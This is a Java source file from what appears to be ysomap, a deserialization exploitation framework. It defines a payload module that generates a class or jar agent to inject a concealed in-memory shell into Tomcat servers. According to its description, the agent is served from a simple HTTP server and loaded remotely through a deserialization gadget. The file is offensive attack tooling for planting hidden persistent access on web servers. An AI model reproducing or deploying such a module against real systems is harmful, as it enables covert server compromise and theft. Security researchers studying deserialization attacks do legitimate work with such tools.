package ysomap.bullets.objects;

import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;

/**
 * @author wh4am1
 * @since 2021/12/06
 */
@Bullets
@Authors({"Wh4am1"})
@Details("动态注入Tomcat隐蔽内存Shell的jar类型Agent，配合SimpleHTTPServer发布地址，同时使用TransformerWithURLClassLoaderBullet序列化加载远程jar")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ClassWithTomcatConcealedMemShell extends AbstractBullet<byte[]> {
    @NotNull
    @Require(name = "classname", detail = "所需生成的类名,如org/test/evil/RunApp")
    public String classname;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar，默认Jar类型")
    public String type = "jar";

    @Override
    public byte[] getObject() throws Exception {
        return ClassFiles.makeClassWithMemShell(classname);
    }
}
